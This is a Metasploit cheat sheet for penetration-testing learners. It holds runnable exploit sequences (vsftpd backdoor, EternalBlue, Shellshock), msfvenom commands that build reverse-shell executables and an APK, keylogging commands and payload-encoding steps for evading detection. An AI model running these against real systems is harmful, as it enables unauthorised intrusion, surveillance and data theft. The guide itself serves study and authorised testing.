---
dg-publish:
---

---

# 🛠️ Metasploit Framework: Full Command Guide

---

## 📘 1. What is Metasploit?

**Metasploit Framework** is a powerful open-source penetration testing tool used to:

- Discover vulnerabilities
    
- Develop exploits
    
- Launch attacks (exploitation)
    
- Maintain access (post-exploitation)
    
- Conduct social engineering
    

🧪 Used by:

- Penetration Testers
    
- Ethical Hackers
    
- Red Teamers
    
- Digital Forensics Experts
    

---

## 💻 2. Starting Metasploit

### 🔹 Open the Console

```bash
msfconsole
```

- Starts the CLI interface
    
- Can take some seconds to load
    

### 🔹 GUI Alternative (Community/Pro)

```bash
msfdb init
msfconsole
```

- GUI is available in **Metasploit Pro** or **Armitage**
    

---

## 📚 3. Basic Navigation Commands

|Command|Explanation|
|---|---|
|`help` or `?`|Show help menu|
|`banner`|Change banner|
|`exit`|Quit the console|
|`search <name>`|Search for a module (exploit, payload, etc.)|
|`use <module>`|Use a module (exploit, auxiliary, etc.)|
|`info`|Show info about current module|
|`back`|Go back to previous menu|
|`show exploits`|List all available exploit modules|
|`show payloads`|List available payloads|
|`show options`|Show required settings|
|`set <option> <value>`|Set required option|
|`run` or `exploit`|Execute the exploit|

---

## 🧨 4. Exploiting a Target

### 🔹 Example: Exploit vsftpd 2.3.4

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.5
set RPORT 21
run
```

---

## 🎯 5. Payloads

### 🔹 Types of Payloads

|Payload Type|Purpose|
|---|---|
|`bind_tcp`|Opens a port on target, attacker connects|
|`reverse_tcp`|Target connects back to attacker|
|`meterpreter`|Advanced shell with post-exploit features|
|`cmd/unix/reverse`|Command shell for Unix systems|

### 🔹 Example: Set Reverse Shell Payload

```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
```

---

## 🛠️ 6. Auxiliary Modules

Non-exploit modules used for:

- Scanning
    
- Enumeration
    
- DoS
    
- Services
    

### 🔹 Example: SMB Scan

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
```

---

## 🧪 7. Post-Exploitation

### 🔹 Available after getting a session

#### List sessions:

```bash
sessions
```

#### Interact with a session:

```bash
sessions -i 1
```

### 🔹 Meterpreter Commands (Windows/Linux)

|Command|Function|
|---|---|
|`sysinfo`|Get OS and hostname info|
|`getuid`|Shows current user|
|`shell`|Drop into shell prompt|
|`download`|Download file from target|
|`upload`|Upload file to target|
|`screenshot`|Take a screenshot|
|`keyscan_start`|Start keystroke capture|
|`keyscan_dump`|Dump captured keystrokes|

---

## 🧰 8. Exploit Example: Windows SMB

### 🔹 EternalBlue (MS17-010)

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit
```

---

## 🛡️ 9. Evading Detection

### 🔹 Encoding Payloads

```bash
set ENCODER x86/shikata_ga_nai
```

### 🔹 Use `msfvenom` to create encoded payloads (outside msfconsole)

---

## 🧪 10. Generating Payloads with `msfvenom`

### 🔹 Reverse TCP Shell (Windows EXE)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe
```

### 🔹 Linux ELF

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell.elf
```

### 🔹 Android APK Payload

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 R > evil.apk
```

---

## 📡 11. Listener for Payloads

If you created a payload with `msfvenom`, you need a listener:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit
```

---

## 📑 12. Key Metasploit File Paths

|File/Dir|Description|
|---|---|
|`/usr/share/metasploit`|Core installation directory|
|`~/.msf4`|User config & loot|
|`/usr/share/metasploit-framework/modules/`|Module directory|

---

## 📊 13. Useful Cheatsheet Summary

|Task|Command Example|
|---|---|
|Search module|`search smb`|
|Load module|`use exploit/windows/smb/ms17_010_eternalblue`|
|Set options|`set RHOSTS <IP>`|
|List payloads|`show payloads`|
|Exploit target|`exploit` or `run`|
|Interact with session|`sessions -i 1`|
|Meterpreter actions|`sysinfo`, `download`, `shell`|

---

## 🧪 14. Practice Targets

- **Metasploitable 2/3** (Intentionally vulnerable VMs)
    
- **DVWA** (Damn Vulnerable Web App)
    
- **Hack The Box** / **TryHackMe Labs**
    

---

## 🧩 15. Real-World Workflow Example

```bash
msfconsole
search apache
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.1.6
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.1.10
run
```

---

## ✅ Final Tips

- Use `msfupdate` to keep Metasploit modules updated
    
- Run `db_nmap` inside Metasploit to integrate scan results
    
- Always get permission before exploiting any system
    

---

